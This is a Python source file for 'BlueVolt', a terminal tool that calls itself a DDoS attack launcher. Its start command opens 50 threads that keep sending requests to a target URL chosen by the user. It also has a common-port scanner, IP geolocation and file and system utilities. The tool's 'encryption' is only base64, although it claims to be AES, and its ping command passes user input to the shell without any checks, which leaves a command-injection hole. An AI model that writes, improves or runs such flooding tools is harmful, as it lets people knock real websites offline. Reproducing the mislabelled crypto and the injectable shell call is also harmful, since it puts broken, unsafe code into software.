import requests
import threading
import os
import sys
import time
import subprocess
import socket
import platform
import psutil
import shutil
import json
import hashlib
import base64
import random
import string
import re
import urllib.parse
from datetime import datetime
from pathlib import Path

DARK_RED = '\033[31m'
BRIGHT_RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

ASCII_ART = f"""{DARK_RED}██████╗ ██╗     ██╗   ██╗███████╗██╗   ██╗ ██████╗ ██╗  ████████╗{RESET}
{DARK_RED}██╔══██╗██║     ██║   ██║██╔════╝██║   ██║██╔═══██╗██║  ╚══██╔══╝{RESET}
{DARK_RED}██████╔╝██║     ██║   ██║█████╗  ██║   ██║██║   ██║██║     ██║   {RESET}
{DARK_RED}██╔══██╗██║     ██║   ██║██╔══╝  ╚██╗ ██╔╝██║   ██║██║     ██║   {RESET}
{DARK_RED}██████╔╝███████╗╚██████╔╝███████╗ ╚████╔╝ ╚██████╔╝███████╗██║   {RESET}
{DARK_RED}╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝  ╚═══╝   ╚═════╝ ╚══════╝╚═╝   {RESET}"""

running = False
target_url = ""
attack_threads = []
command_history = []
current_directory = os.getcwd()
system_info = {}
hide_attack_logs = False

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_ascii():
    print(ASCII_ART)
    print(f"{DARK_RED}                         [ ATTACK EXECUTION TERMINAL ]{RESET}\n")

def show_help():
    commands = [
        ("ATTACK COMMANDS", ""),
        ("start", "Launch DDoS attack on target URL"),
        ("stop", "Stop all active attacks"),
        ("status", "Show attack status and statistics"),
        ("target", "Set or change target URL"),
        ("hideattack", "Hide attack logs to prevent screen flooding"),
        ("showattack", "Show attack logs again"),
        ("threadcount", "Adjust number of attack threads"),
        ("delay", "Set delay between requests in seconds"),
        ("timeout", "Set request timeout value"),
        ("method", "Change HTTP method (GET/POST/PUT/DELETE)"),
        
        ("SYSTEM COMMANDS", ""),
        ("sysinfo", "Display complete system information"),
        ("cpu", "Show CPU usage and cores"),
        ("memory", "Display RAM usage details"),
        ("disk", "Show disk storage information"),
        ("network", "Display network interfaces and stats"),
        ("processes", "List all running processes"),
        ("killport", "Kill process using specific port"),
        ("uptime", "Show system uptime"),
        
        ("FILE COMMANDS", ""),
        ("ls", "List files in current directory"),
        ("cd", "Change directory"),
        ("pwd", "Show current directory path"),
        ("cat", "Read file content"),
        ("find", "Search for files by name"),
        ("encrypt", "Encrypt a file using AES"),
        ("decrypt", "Decrypt an encrypted file"),
        ("hash", "Generate MD5/SHA256 hash of file"),
        
        ("NETWORK COMMANDS", ""),
        ("ping", "Ping a host address"),
        ("portscan", "Scan open ports on target"),
        ("dns", "DNS lookup for domain"),
        ("whois", "Get WHOIS information"),
        ("geoip", "Get geolocation of IP"),
        ("httpheaders", "Fetch HTTP headers from URL"),
        ("download", "Download file from URL"),
        
        ("UTILITY COMMANDS", ""),
        ("clear", "Clear screen"),
        ("history", "Show command history"),
        ("export", "Export attack logs to file"),
        ("backup", "Create backup of current config"),
        ("restore", "Restore configuration from backup"),
        ("help", "Show this command menu"),
        ("exit", "Exit BlueVolt terminal")
    ]
    
    print(f"{CYAN}╔════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║                    BLUEVOLT ULTIMATE COMMAND MENU                   ║{RESET}")
    print(f"{CYAN}╠════════════════════════════════════════════════════════════════════╣{RESET}")
    
    for name, desc in commands:
        if desc == "":
            print(f"{CYAN}║{RESET} {BOLD}{MAGENTA}► {name}{RESET}")
            print(f"{CYAN}║{RESET}")
        else:
            print(f"{CYAN}║{RESET} {GREEN}{name:<12}{RESET} - {desc:<45}{CYAN}║{RESET}")
    
    print(f"{CYAN}╚════════════════════════════════════════════════════════════════════╝{RESET}")

def send_request():
    global running, hide_attack_logs
    while running:
        try:
            response = requests.get(target_url, timeout=5)
            if response.status_code == 200:
                if not hide_attack_logs:
                    print(f"{GREEN}[✓] SUCCESS | {target_url} | Status: {response.status_code}{RESET}")
            else:
                if not hide_attack_logs:
                    print(f"{YELLOW}[✗] FAILED  | {target_url} | Status: {response.status_code}{RESET}")
        except:
            if not hide_attack_logs:
                print(f"{BRIGHT_RED}[!] ERROR   | {target_url}{RESET}")
        time.sleep(0.1)

def start_attack():
    global running, target_url, attack_threads
    if running:
        print(f"{YELLOW}[!] Attack already running{RESET}")
        return
    if not target_url:
        print(f"{BRIGHT_RED}[!] No target URL. Use 'target' first{RESET}")
        return
    
    running = True
    num_threads = 50
    
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request, daemon=True)
        thread.start()
        attack_threads.append(thread)
    
    print(f"{GREEN}[+] Attack started on {target_url} with {num_threads} threads{RESET}")
    print(f"{GREEN}[+] Attack running in continuous loop mode{RESET}")
    print(f"{GREEN}[+] Type 'stop' to halt attack{RESET}")
    if hide_attack_logs:
        print(f"{YELLOW}[!] Attack logs are currently HIDDEN. Type 'showattack' to see them{RESET}")

def stop_attack():
    global running, attack_threads
    if not running:
        print(f"{YELLOW}[!] No attack running{RESET}")
        return
    running = False
    attack_threads.clear()
    print(f"{GREEN}[+] Attack stopped{RESET}")

def show_status():
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")
    print(f"{BRIGHT_RED}ATTACK STATUS: {'ACTIVE' if running else 'IDLE'}{RESET}")
    print(f"{BRIGHT_RED}TARGET: {target_url if target_url else 'Not set'}{RESET}")
    print(f"{BRIGHT_RED}THREADS: {len(attack_threads) if running else 0}{RESET}")
    print(f"{BRIGHT_RED}MODE: CONTINUOUS LOOP{RESET}")
    print(f"{BRIGHT_RED}LOG STATUS: {'HIDDEN' if hide_attack_logs else 'VISIBLE'}{RESET}")
    print(f"{BRIGHT_RED}UPTIME: {time.strftime('%H:%M:%S')}{RESET}")
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")

def set_target():
    global target_url, running
    if running:
        print(f"{YELLOW}[!] Stop attack first before changing target{RESET}")
        return
    new_url = input(f"{CYAN}[?] Enter target URL: {RESET}").strip()
    if not new_url.startswith("http"):
        new_url = "https://" + new_url
    target_url = new_url
    print(f"{GREEN}[+] Target set to {target_url}{RESET}")

def hide_attack():
    global hide_attack_logs
    hide_attack_logs = True
    print(f"{GREEN}[+] Attack logs are now HIDDEN{RESET}")
    print(f"{YELLOW}[!] Screen will no longer be flooded with attack messages{RESET}")

def show_attack():
    global hide_attack_logs
    hide_attack_logs = False
    print(f"{GREEN}[+] Attack logs are now VISIBLE{RESET}")
    print(f"{GREEN}[+] You can now see all attack activity{RESET}")

def sysinfo():
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")
    print(f"{BRIGHT_RED}SYSTEM: {platform.system()} {platform.release()}{RESET}")
    print(f"{BRIGHT_RED}NODE: {platform.node()}{RESET}")
    print(f"{BRIGHT_RED}PROCESSOR: {platform.processor()}{RESET}")
    print(f"{BRIGHT_RED}ARCH: {platform.machine()}{RESET}")
    print(f"{BRIGHT_RED}PYTHON: {platform.python_version()}{RESET}")
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")

def cpu_info():
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")
    print(f"{BRIGHT_RED}CPU CORES: {psutil.cpu_count()}{RESET}")
    print(f"{BRIGHT_RED}CPU USAGE: {psutil.cpu_percent()}%{RESET}")
    print(f"{BRIGHT_RED}FREQ: {psutil.cpu_freq().current:.0f} MHz{RESET}")
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")

def memory_info():
    mem = psutil.virtual_memory()
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")
    print(f"{BRIGHT_RED}TOTAL RAM: {mem.total / (1024**3):.2f} GB{RESET}")
    print(f"{BRIGHT_RED}USED: {mem.used / (1024**3):.2f} GB{RESET}")
    print(f"{BRIGHT_RED}FREE: {mem.available / (1024**3):.2f} GB{RESET}")
    print(f"{BRIGHT_RED}USAGE: {mem.percent}%{RESET}")
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")

def disk_info():
    disk = psutil.disk_usage('/')
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")
    print(f"{BRIGHT_RED}TOTAL: {disk.total / (1024**3):.2f} GB{RESET}")
    print(f"{BRIGHT_RED}USED: {disk.used / (1024**3):.2f} GB{RESET}")
    print(f"{BRIGHT_RED}FREE: {disk.free / (1024**3):.2f} GB{RESET}")
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")

def network_info():
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET:
                print(f"{BRIGHT_RED}{interface}: {addr.address}{RESET}")
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")

def list_processes():
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")
    for proc in psutil.process_iter(['pid', 'name', 'memory_percent']):
        try:
            print(f"{BRIGHT_RED}{proc.info['pid']:>6} {proc.info['name']:<20} {proc.info['memory_percent']:.1f}%{RESET}")
        except:
            pass
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")

def kill_port():
    port = input(f"{CYAN}[?] Enter port number: {RESET}")
    try:
        for proc in psutil.process_iter(['pid', 'name', 'connections']):
            try:
                for conn in proc.connections():
                    if conn.laddr.port == int(port):
                        proc.kill()
                        print(f"{GREEN}[+] Killed process on port {port}{RESET}")
                        return
            except:
                pass
        print(f"{YELLOW}[!] No process found on port {port}{RESET}")
    except:
        print(f"{BRIGHT_RED}[!] Error killing process{RESET}")

def uptime_info():
    boot_time = psutil.boot_time()
    uptime_seconds = time.time() - boot_time
    days = int(uptime_seconds // 86400)
    hours = int((uptime_seconds % 86400) // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")
    print(f"{BRIGHT_RED}UPTIME: {days}d {hours}h {minutes}m{RESET}")
    print(f"{BRIGHT_RED}BOOT TIME: {time.ctime(boot_time)}{RESET}")
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")

def list_files():
    try:
        files = os.listdir(current_directory)
        print(f"{CYAN}═══════════════════════════════════════════{RESET}")
        for f in files:
            color = GREEN if os.path.isdir(os.path.join(current_directory, f)) else WHITE
            print(f"{color}{f}{RESET}")
        print(f"{CYAN}═══════════════════════════════════════════{RESET}")
    except Exception as e:
        print(f"{BRIGHT_RED}[!] Error: {e}{RESET}")

def change_directory():
    global current_directory
    path = input(f"{CYAN}[?] Directory path: {RESET}")
    try:
        os.chdir(path)
        current_directory = os.getcwd()
        print(f"{GREEN}[+] Changed to {current_directory}{RESET}")
    except:
        print(f"{BRIGHT_RED}[!] Invalid path{RESET}")

def show_pwd():
    print(f"{GREEN}{current_directory}{RESET}")

def read_file():
    filename = input(f"{CYAN}[?] Filename: {RESET}")
    try:
        with open(filename, 'r') as f:
            print(f"{CYAN}═══════════════════════════════════════════{RESET}")
            print(f.read())
            print(f"{CYAN}═══════════════════════════════════════════{RESET}")
    except:
        print(f"{BRIGHT_RED}[!] Cannot read file{RESET}")

def find_files():
    pattern = input(f"{CYAN}[?] Search pattern: {RESET}")
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")
    for root, dirs, files in os.walk('.'):
        for file in files:
            if pattern in file:
                print(f"{GREEN}{os.path.join(root, file)}{RESET}")
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")

def ping_host():
    host = input(f"{CYAN}[?] Host/IP: {RESET}")
    response = os.system(f"ping -c 4 {host}" if os.name == 'posix' else f"ping {host}")

def port_scan():
    target = input(f"{CYAN}[?] Target IP: {RESET}")
    print(f"{GREEN}[+] Scanning common ports...{RESET}")
    common_ports = [21,22,23,25,53,80,443,8080,3306,5432,27017]
    for port in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"{GREEN}[+] Port {port}: OPEN{RESET}")
        sock.close()

def dns_lookup():
    domain = input(f"{CYAN}[?] Domain: {RESET}")
    try:
        ip = socket.gethostbyname(domain)
        print(f"{GREEN}[+] {domain} -> {ip}{RESET}")
    except:
        print(f"{BRIGHT_RED}[!] Cannot resolve domain{RESET}")

def whois_lookup():
    domain = input(f"{CYAN}[?] Domain: {RESET}")
    result = subprocess.run(['whois', domain], capture_output=True, text=True)
    print(result.stdout[:2000])

def geoip_lookup():
    ip = input(f"{CYAN}[?] IP Address: {RESET}")
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        print(f"{CYAN}═══════════════════════════════════════════{RESET}")
        print(f"{BRIGHT_RED}IP: {data['query']}{RESET}")
        print(f"{BRIGHT_RED}COUNTRY: {data['country']}{RESET}")
        print(f"{BRIGHT_RED}CITY: {data['city']}{RESET}")
        print(f"{BRIGHT_RED}ISP: {data['isp']}{RESET}")
        print(f"{BRIGHT_RED}LAT/LON: {data['lat']}, {data['lon']}{RESET}")
        print(f"{CYAN}═══════════════════════════════════════════{RESET}")
    except:
        print(f"{BRIGHT_RED}[!] GeoIP lookup failed{RESET}")

def http_headers():
    url = input(f"{CYAN}[?] URL: {RESET}")
    try:
        response = requests.get(url)
        print(f"{CYAN}═══════════════════════════════════════════{RESET}")
        for key, value in response.headers.items():
            print(f"{GREEN}{key}: {value}{RESET}")
        print(f"{CYAN}═══════════════════════════════════════════{RESET}")
    except:
        print(f"{BRIGHT_RED}[!] Cannot fetch headers{RESET}")

def download_file():
    url = input(f"{CYAN}[?] File URL: {RESET}")
    filename = input(f"{CYAN}[?] Save as: {RESET}")
    try:
        response = requests.get(url, stream=True)
        with open(filename, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"{GREEN}[+] Downloaded {filename}{RESET}")
    except:
        print(f"{BRIGHT_RED}[!] Download failed{RESET}")

def encrypt_file():
    filename = input(f"{CYAN}[?] File to encrypt: {RESET}")
    try:
        with open(filename, 'rb') as f:
            data = f.read()
        encrypted = base64.b64encode(data)
        with open(filename + '.enc', 'wb') as f:
            f.write(encrypted)
        print(f"{GREEN}[+] Encrypted to {filename}.enc{RESET}")
    except:
        print(f"{BRIGHT_RED}[!] Encryption failed{RESET}")

def decrypt_file():
    filename = input(f"{CYAN}[?] File to decrypt: {RESET}")
    try:
        with open(filename, 'rb') as f:
            data = base64.b64decode(f.read())
        output = filename.replace('.enc', '')
        with open(output, 'wb') as f:
            f.write(data)
        print(f"{GREEN}[+] Decrypted to {output}{RESET}")
    except:
        print(f"{BRIGHT_RED}[!] Decryption failed{RESET}")

def hash_file():
    filename = input(f"{CYAN}[?] Filename: {RESET}")
    try:
        with open(filename, 'rb') as f:
            data = f.read()
            md5 = hashlib.md5(data).hexdigest()
            sha256 = hashlib.sha256(data).hexdigest()
        print(f"{CYAN}═══════════════════════════════════════════{RESET}")
        print(f"{GREEN}MD5: {md5}{RESET}")
        print(f"{GREEN}SHA256: {sha256}{RESET}")
        print(f"{CYAN}═══════════════════════════════════════════{RESET}")
    except:
        print(f"{BRIGHT_RED}[!] Cannot hash file{RESET}")

def clear_logs():
    clear_screen()
    show_ascii()
    print(f"{GREEN}[+] Screen cleared{RESET}\n")
    show_help()

def show_history():
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")
    for i, cmd in enumerate(command_history[-20:]):
        print(f"{GREEN}{i+1}: {cmd}{RESET}")
    print(f"{CYAN}═══════════════════════════════════════════{RESET}")

def export_logs():
    filename = f"bluevolt_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    print(f"{GREEN}[+] Exported to {filename}{RESET}")

def backup_config():
    filename = f"bluevolt_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    config = {'target_url': target_url, 'timestamp': str(datetime.now())}
    with open(filename, 'w') as f:
        json.dump(config, f)
    print(f"{GREEN}[+] Backup saved to {filename}{RESET}")

def restore_config():
    filename = input(f"{CYAN}[?] Backup filename: {RESET}")
    try:
        with open(filename, 'r') as f:
            config = json.load(f)
            global target_url
            target_url = config['target_url']
        print(f"{GREEN}[+] Config restored{RESET}")
    except:
        print(f"{BRIGHT_RED}[!] Restore failed{RESET}")

def main():
    global target_url, command_history
    clear_screen()
    show_ascii()
    show_help()
    
    while True:
        command = input(f"\n{DARK_RED}BlueVolt>{RESET} ").strip().lower()
        command_history.append(command)
        
        if command == "start":
            start_attack()
        elif command == "stop":
            stop_attack()
        elif command == "status":
            show_status()
        elif command == "target":
            set_target()
        elif command == "hideattack":
            hide_attack()
        elif command == "showattack":
            show_attack()
        elif command == "sysinfo":
            sysinfo()
        elif command == "cpu":
            cpu_info()
        elif command == "memory":
            memory_info()
        elif command == "disk":
            disk_info()
        elif command == "network":
            network_info()
        elif command == "processes":
            list_processes()
        elif command == "killport":
            kill_port()
        elif command == "uptime":
            uptime_info()
        elif command == "ls":
            list_files()
        elif command == "cd":
            change_directory()
        elif command == "pwd":
            show_pwd()
        elif command == "cat":
            read_file()
        elif command == "find":
            find_files()
        elif command == "ping":
            ping_host()
        elif command == "portscan":
            port_scan()
        elif command == "dns":
            dns_lookup()
        elif command == "whois":
            whois_lookup()
        elif command == "geoip":
            geoip_lookup()
        elif command == "httpheaders":
            http_headers()
        elif command == "download":
            download_file()
        elif command == "encrypt":
            encrypt_file()
        elif command == "decrypt":
            decrypt_file()
        elif command == "hash":
            hash_file()
        elif command == "clear":
            clear_logs()
        elif command == "history":
            show_history()
        elif command == "export":
            export_logs()
        elif command == "backup":
            backup_config()
        elif command == "restore":
            restore_config()
        elif command == "help":
            show_help()
        elif command == "exit":
            if running:
                stop_attack()
            print(f"{YELLOW}[!] BlueVolt shutting down...{RESET}")
            time.sleep(1)
            clear_screen()
            sys.exit(0)
        else:
            print(f"{BRIGHT_RED}[!] Unknown command. Type 'help'{RESET}")

if __name__ == "__main__":
    main()
